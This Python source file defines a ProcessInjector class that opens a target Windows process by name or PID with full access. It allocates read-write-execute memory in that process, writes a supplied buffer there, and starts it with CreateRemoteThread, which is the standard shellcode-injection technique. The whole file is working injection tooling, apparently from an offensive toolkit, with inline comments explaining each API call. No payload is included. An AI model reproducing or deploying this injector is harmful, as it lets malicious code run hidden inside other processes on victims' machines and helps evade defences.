from sys import exit

try:
    from psutil import pids
    from psutil import Process as ps
except ImportError:
    print("Please run ```pip3 install -r requirements.txt```")
    exit(1)

from typing import Union

from winapi_constants import PROCESS_ALL_ACCESS
from winapi_constants import MEM_COMMIT
from winapi_constants import MEM_RESERVE
from winapi_constants import PAGE_EXECUTE_READWRITE
from winapi_constants import EXECUTE_IMMEDIATELY

from ctypes import windll
from ctypes import c_int
from ctypes import c_ulong
from ctypes import c_char_p
from ctypes import c_void_p
from ctypes import byref
from ctypes import sizeof
from ctypes import Structure
from ctypes import POINTER as Pointer

from ctypes.wintypes import DWORD
from ctypes.wintypes import LPVOID
from ctypes.wintypes import BOOL


class SecurityAttributes(Structure):
    """SECURITY_ATTRIBUTES structure that specifies 
    a security descriptor for the new thread created
    by ```CreateRemoteThread```
    """
    _fields_ = [
        ('nLength', DWORD),
        ('lpSecurityDescriptor', LPVOID),
        ('bInheritHandle', BOOL),
    ]


class ProcessInjector:
    def __init__(self, proc: Union[str, int], *, pid=False):
        if not pid:
            if proc.endswith(".exe"):
                self.pid = self._get_process_id(proc)
            else:
                self.pid = self._get_process_id(proc+".exe")
        else:
            self.pid = int(proc)
        self.kern32 = windll.kernel32

    def __enter__(self):
        self.proc_handle = self.kern32.OpenProcess(
            PROCESS_ALL_ACCESS, # Give all access to the created process handle
            True,               # Subprocess do not inherit this handle
            self.pid)           # PID of target process
        if not self.proc_handle:
            print("[-] Unable to obtain a handle to the target process")
            exit(1)
        else:
            return self

    def __exit__(self, exception_type, exception_value, exeception_traceback):
        self.kern32.CloseHandle(self.proc_handle) # Closing process handle with ```CloseHandle```
        return False

    def _get_process_id(self, proc: str) -> str:
        return [p for p in pids() if ps(p).name() == proc][0]
    
    def virtual_alloc_ex(self, buf_size: int):
        self.alloc_mem_base_addr = self.kern32.VirtualAllocEx(
            self.proc_handle,         # Process handle
            0,                        # Let function determine where to allocate the memory
            buf_size,                 # Size of buf
            MEM_RESERVE | MEM_COMMIT, # Commit the region of virtual memory pages we created
            PAGE_EXECUTE_READWRITE)   # Set read, write, and execute permissions to allocated memory
        if not self.alloc_mem_base_addr:
            raise Exception("[-] System error with code: %s" % self.kern32.GetLastError())
        else:
            return self.alloc_mem_base_addr

    def write_process_memory(self, lp_buffer, n_size):
        lp_buffer = c_char_p(lp_buffer)
        return_val = self.kern32.WriteProcessMemory(
            self.proc_handle,                   # Process handle
            c_void_p(self.alloc_mem_base_addr), # Base address returned by ```VirtualAllocEx```
            lp_buffer,                          # The data we want to write into the allocated memory
            n_size,                             # The amount of data from our buffer we wish to write
            None)                               # Ignore the number of bytes written
        if not return_val:
            raise Exception("[-] System error with code: %s" % self.kern32.GetLastError())
            return
    
    def create_remote_thread(self):
        lp_security_attributes = Pointer(SecurityAttributes)                         # A pointer to a SecurityAttributes struct
        thread_attributes = SecurityAttributes(sizeof(SecurityAttributes), 0, False) # A declaration of a SecurityAttributes struct
        lp_thread_attributes = lp_security_attributes(thread_attributes)             # A pointer pointing to a SecurityAttributes object

        thread_id = c_ulong(0)
        return_val = self.kern32.CreateRemoteThread(
            self.proc_handle,         # Process handle
            lp_thread_attributes,     # The pointer to our ```SecurityAttributes``` struct 
            0,                        # Use default size of executable
            self.alloc_mem_base_addr, # Base address returned by ```VirtualAllocEx```
            0,                        # Ignore lpParamter
            EXECUTE_IMMEDIATELY,      # Run thread immediately after creation
            byref(thread_id))         # Ignore thread identifier
        if not return_val:
            raise Exception("[-] System error with code: %s" % self.kern32.GetLastError())
            return
        return thread_id
